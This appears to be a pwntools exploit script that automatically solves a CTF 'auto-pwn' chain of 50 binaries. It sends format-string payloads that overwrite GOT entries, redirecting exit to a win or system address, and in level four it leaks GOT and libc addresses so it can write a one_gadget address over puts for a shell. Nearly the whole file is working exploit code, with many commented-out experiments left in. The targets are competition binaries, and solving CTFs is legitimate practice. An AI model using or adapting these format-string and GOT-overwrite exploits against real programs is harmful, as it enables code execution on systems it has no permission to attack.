
from pwn import *

from time import sleep
#import binascii
#import angr

from generic_solver_functions import get_binary, exploit_intermediate_binary, exploit_final_binary
from solver_utils import *

initial_command = b'nc localhost 11001'
#initial_command = b'nc auto-pwn.chal.csaw.io 11001'
initial_password = open("first_password.txt", "r").readlines()[0].strip().encode()


def solve_level_one(p, path_to_binary):
    #print("Solver function gets called here!")
    e = ELF(path_to_binary)
    p.recvuntil("Proceeding to the challenge...")
    p.recvuntil("> ")
    #p.interactive()
    # The following is the actual solution for a single challenge, first done manually.
    # Want to write: 0804935b
    # To this address:
    exit_address = e.got['exit']
    #print(hex(e.got['exit']))
    #payload = b''
    #for i in range(20):
    #    payload += b"A"*2+str(i).encode()+b" "
    #payload += b"%p "*20
    #p.send(payload + b"\n")
    '''
    AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
    '''

    #def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
        

    #payload_length = 0
    #payload = b''
    #payload += b"A"*68
    ##payload = b"JUN "*3
    ##payload += b"%23$pAA "
    ##payload += b"%24$pAA "
    ##payload += b"%25$pAA "
    ##payload += b"%26$pAA "
    ##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
    #payload += b"IIIIJJJJKKKKLLLL"
    ##payload += p32(exit_address)
    ##payload += p32(exit_address+1)
    ##payload += p32(exit_address+2)
    ##payload += p32(exit_address+3)
    #payload += b"\n"

    # buf_length = 76

    def retrieve_function_addr(path_to_binary, function_name):
        cmd = b"readelf -s " + path_to_binary +  b"| grep " + function_name
        test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
        #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
        tmp = test.stdout.read()
        #print("result of system call = " + str(tmp))
        #print(str(tmp).__class__)
        addr =  tmp.strip().split(b" ")[1]
        #print("addr = " + str(addr))
        addr = b'0x' + addr
        #print("addr = " + str(addr))
        addr = int(addr,16)
        #print("addr = " + str(addr))
        return addr

    win_addr = retrieve_function_addr(path_to_binary, b"win")
    print("addr = " + str(win_addr))
    print("    which in hex = " + hex(win_addr))

    #src = 0x0804935b
    print("type of exit_address = " + str(exit_address.__class__))
    #dst = exit_address
    #dpn = 23
    #buf_length = 76
    #payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
    payload = gen_x86_fmt_string(src=win_addr, dst=exit_address, dpn=10, buf_length=18)
    payload += b"\n"
    print("payload = " + str(payload))
    print("payload class = " + str(payload.__class__))

    #sleep(20)
    p.send(payload)
    #p.interactive()
    sleep(1)
    #gen_fmt_string_write_exploit_x86
    #p.interactive()
    #exit(0)

def solve_level_two(p, path_to_binary):
    #print("Solver function gets called here!")
    e = ELF(path_to_binary)
    p.recvuntil("Proceeding to the challenge...")
    p.recvuntil("> ")
    #p.interactive()
    # The following is the actual solution for a single challenge, first done manually.
    # Want to write: 0804935b
    # To this address:
    exit_address = e.got['exit']
    #print(hex(e.got['exit']))
    #payload = b''
    #for i in range(20):
    #    payload += b"A"*2+str(i).encode()+b" "
    #payload += b"%p "*20
    #p.send(payload + b"\n")
    '''
    AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
    '''

    #def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
        

    #payload_length = 0
    #payload = b''
    #payload += b"A"*68
    ##payload = b"JUN "*3
    ##payload += b"%23$pAA "
    ##payload += b"%24$pAA "
    ##payload += b"%25$pAA "
    ##payload += b"%26$pAA "
    ##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
    #payload += b"IIIIJJJJKKKKLLLL"
    ##payload += p32(exit_address)
    ##payload += p32(exit_address+1)
    ##payload += p32(exit_address+2)
    ##payload += p32(exit_address+3)
    #payload += b"\n"

    # buf_length = 76

    def retrieve_function_addr(path_to_binary, function_name):
        cmd = b"readelf -s " + path_to_binary +  b"| grep " + function_name
        test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
        #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
        tmp = test.stdout.read()
        #print("result of system call = " + str(tmp))
        #print(str(tmp).__class__)
        addr =  tmp.strip().split(b" ")[1]
        #print("addr = " + str(addr))
        addr = b'0x' + addr
        #print("addr = " + str(addr))
        addr = int(addr,16)
        #print("addr = " + str(addr))
        return addr

    win_addr = retrieve_function_addr(path_to_binary, b"win")
    print("addr = " + str(win_addr))
    print("    which in hex = " + hex(win_addr))

    #src = 0x0804935b
    print("type of exit_address = " + str(exit_address.__class__))
    #dst = exit_address
    #dpn = 23
    #buf_length = 76
    #payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
    #payload = gen_x86_fmt_string(src=win_addr, dst=exit_address, dpn=10, buf_length=18)
    payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
    payload += b"\n"
    print("payload = " + str(payload))
    print("payload class = " + str(payload.__class__))
    print("payload length = " + str(len(payload)))

    #sleep(20)
    p.send(payload)
    #p.interactive()
    sleep(1)
    #gen_fmt_string_write_exploit_x86
    #p.interactive()
    #exit(0)


def solve_level_three(p, path_to_binary):
    #print("Solver function gets called here!")
    e = ELF(path_to_binary)
    p.recvuntil("Proceeding to the challenge...")
    p.recvuntil("> ")
    #p.interactive()
    # The following is the actual solution for a single challenge, first done manually.
    # Want to write: 0804935b
    # To this address:
    exit_address = e.got['exit']
    #print(hex(e.got['exit']))
    #payload = b''
    #for i in range(20):
    #    payload += b"A"*2+str(i).encode()+b" "
    #payload += b"%p "*20
    #p.send(payload + b"\n")
    '''
    AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
    '''

    #def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
        

    #payload_length = 0
    #payload = b''
    #payload += b"A"*68
    ##payload = b"JUN "*3
    ##payload += b"%23$pAA "
    ##payload += b"%24$pAA "
    ##payload += b"%25$pAA "
    ##payload += b"%26$pAA "
    ##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
    #payload += b"IIIIJJJJKKKKLLLL"
    ##payload += p32(exit_address)
    ##payload += p32(exit_address+1)
    ##payload += p32(exit_address+2)
    ##payload += p32(exit_address+3)
    #payload += b"\n"

    # buf_length = 76

    def retrieve_function_addr(path_to_binary):
        #cmd = b"readelf -s " + path_to_binary +  b"| grep " + function_name
        cmd = b"objdump -d " + path_to_binary +  b"| grep system | tail -n 1"
        test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
        #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
        tmp = test.stdout.read()
        #print("result of system call = " + str(tmp))
        #print(str(tmp).__class__)
        addr = tmp.strip().split(b' ')[0].split(b'\t')[0][:-1]
        #addr =  tmp.strip().split(b" ")[1]
        #print("addr = " + str(addr))
        addr = b'0x' + addr
        #print("addr = " + str(addr))
        addr = int(addr,16)-11 # always an offset of 11 bytes
        #print("addr = " + str(addr))
        return addr

    win_addr = retrieve_function_addr(path_to_binary)
    print("addr = " + str(win_addr))
    print("    which in hex = " + hex(win_addr))

    #src = 0x0804935b
    print("type of exit_address = " + str(exit_address.__class__))
    #dst = exit_address
    #dpn = 23
    #buf_length = 76
    #payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
    #payload = gen_x86_fmt_string(src=win_addr, dst=exit_address, dpn=10, buf_length=18)
    payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
    payload += b"\n"
    print("payload = " + str(payload))
    print("payload class = " + str(payload.__class__))
    print("payload length = " + str(len(payload)))

    #sleep(20)
    p.send(payload)
    #p.interactive()
    sleep(1)
    #gen_fmt_string_write_exploit_x86
    #p.interactive()
    #exit(0)

def solve_level_four(p, path_to_binary):
    #print("Solver function gets called here!")
    e = ELF(path_to_binary)
    p.recvuntil("Proceeding to the challenge...")
    p.recvuntil("> ")
    # The following is the actual solution for a single challenge, first done manually.

    # Want to write: 0804935b
    # To this address:
    exit_address = e.got['exit']
    print("exit_address = " + hex(exit_address))
    #print(hex(e.got['exit']))
    #payload = b''
    #for i in range(20):
    #    payload += b"A"*2+str(i).encode()+b" "
    #payload += b"%p "*20
    #p.send(payload + b"\n")
    '''
    AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
    '''

    #def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
        

    #payload_length = 0
    #payload = b''
    #payload += b"A"*68
    ##payload = b"JUN "*3
    ##payload += b"%23$pAA "
    ##payload += b"%24$pAA "
    ##payload += b"%25$pAA "
    ##payload += b"%26$pAA "
    ##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
    #payload += b"IIIIJJJJKKKKLLLL"
    ##payload += p32(exit_address)
    ##payload += p32(exit_address+1)
    ##payload += p32(exit_address+2)
    ##payload += p32(exit_address+3)
    #payload += b"\n"

    # buf_length = 76

    '''
    def retrieve_function_addr(binary_name, function_name):
        cmd = b"readelf -s ./" + binary_name +  b"| grep " + function_name
        test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
        #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
        tmp = test.stdout.read()
        #print("result of system call = " + str(tmp))
        #print(str(tmp).__class__)
        addr =  tmp.strip().split(b" ")[1]
        #print("addr = " + str(addr))
        addr = b'0x' + addr
        #print("addr = " + str(addr))
        addr = int(addr,16)
        #print("addr = " + str(addr))
        return addr
    '''
    #win_addr = retrieve_function_addr(b"level_one", b"win")
    #print("addr = " + str(win_addr))
    #print("    which in hex = " + hex(win_addr))
    #win_addr = 0x4012d0
    #src = 0x0804935b
    print("type of exit_address = " + str(exit_address.__class__))
    #dst = exit_address
    #dpn = 23
    #buf_length = 76

    #payload = b"A"*120 + b"B"*8 + b"%21$p" + b"\n"

    payload = b"%7$p %8$p"

    # Offset to exit: 0x6c


    #payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
    #payload = gen_fmt_string_write_exploit_x86_64(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
    #payload += b"\n"
    print("payload = " + str(payload))
    print("payload class = " + str(payload.__class__))

    #sleep(20)
    ## Report 1: Leak BSS addresses and get GOT addresses
    p.send(payload + b"\n")
    p.recvuntil("Report 1:\n")
    tmp = p.recvline().strip().split(b' ')[0]
    report_number_addr = int(tmp,16)
    print("report_number address = " + hex(report_number_addr))

    puts_got_addr = report_number_addr - 0xb4
    fgets_got_addr = report_number_addr - 0x84

    print("puts GOT address = " + hex(puts_got_addr))
    print("fgets GOT address = " + hex(fgets_got_addr))

    ## Report 2: Leak GOT addresses.
    p.recvuntil("> ")
    #p.send(b"%9$pAAAA" + b"BBBBBBBB" +  b"\n")

    payload = b"%10$s A %12$s BB" + p64(fgets_got_addr) + b"CCCCCCCC" + p64(puts_got_addr)
    payload = b"%9$s AA " + p64(puts_got_addr)# + b"CCCCCCCC" + p64(puts_got_addr)
    print(b"Payload 2 = " + payload)
    p.send(payload + b"\n")
    p.recvuntil("Report 2:\n")

    #p.interactive()
    tmp = p.recvline().strip().split(b' ')
    print("tmp = " + str(tmp))
    #payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
    #p.interactive()
    def libc_bytes_to_libc_addr(s):
        s += b'\x00'*(8-len(s))
        return u64(s)
    #fgets_libc_addr = libc_bytes_to_libc_addr(tmp[0])
    puts_libc_addr = libc_bytes_to_libc_addr(tmp[0])

    #print("fgets libc addr: " + hex(fgets_libc_addr))
    print("puts libc addr: " + hex(puts_libc_addr))
    #gen_fmt_string_write_exploit_x86

    ## Report 3: Leak LIBC address.
    p.recvuntil("> ")
    # Let's try overwriting exit(0) first.
    #p.interactive()
    #if local:
    puts_libc_offset = 0x875a0
    libc_base_addr = puts_libc_addr - puts_libc_offset  
    one_gadget_addr = libc_base_addr + 0xe6c81
    print("one_gadget address = " + hex(one_gadget_addr))

    payload = b"%12$p A "+b"A"*24 + b"BBBBBBBB" + b"\n"
    print(b"payload = " + payload)
    payload = gen_x86_64_fmt_string(src=one_gadget_addr, dst=puts_got_addr, dpn=12, buf_length=32)
    #print(b"Round 3 payload = " + payload)
    #sleep(20)
    p.send(payload + b"\n")
    #payload = b"%9$p AA " + b"BBBBBBBB"
    #p.interactive()
    sleep(1)


#p = process(command, shell=True)
i = 1
N = 50 # 11 # 50
password = initial_password
command = initial_command
level_two_threshold = 16 # 3 # 16
level_three_threshold = 31 # 5 # 31
level_four_threshold = 46 # 7 # 46

#command = b'nc localhost 9001' #b'./binary_1_copy'
while (i < N):
    if i < level_two_threshold:
        command, password = exploit_intermediate_binary(command, password, i, solve_level_one)
    elif i < level_three_threshold:
        command, password = exploit_intermediate_binary(command, password, i, solve_level_two)
    elif i < level_four_threshold:
        command, password = exploit_intermediate_binary(command, password, i, solve_level_three)
    else:
        command, password = exploit_intermediate_binary(command, password, i, solve_level_four)
    i += 1
    #p.interactive()
exploit_final_binary(command, password, N, solve_level_four)

#p.interactive()

# Now I'm just going to exploit the first file in an automated manner
# 1. Find the win function
# 2. Figure out what the input must look like to overflow the buffer
# 3. Figure out the input to angr that creates that string for this binary
# 4. Put it all together in a function
#pwnable = './test_binaries/first_file'
#e = ELF(pwnable)
#WIN_ADDR = e.symbols['win']
#print(hex(WIN_ADDR)) # Okay, got it
# 
# 2. Figure out what the input must look like to overflow the buffer
#p = gdb.debug(pwnable, '''
#              b *0x400a1b
#              ''')
#p.send('A'*63 + '\n')
# Okay, the last eight bytes overwrite the return address


# generate angr project
'''
print("Generating angr project")
p = angr.Project(pwnable)
print("Generated angr project")

# get a generic representation of the possible program states at the program's entry point
state = p.factory.entry_state()
print("Generated entry state")

# get a SimulationManager to handle the flow of the symbolic execution engine
sm = p.factory.simulation_manager(state, save_unconstrained=True)
print("Generated simulation manager")

sm.explore(find=WIN_ADDR)
print("Finished sm.explore call")
found = sm.found[0]
print(str(sm.found))
#p.interactive()

#print(str(e.symbols))
#p.interactive()
'''
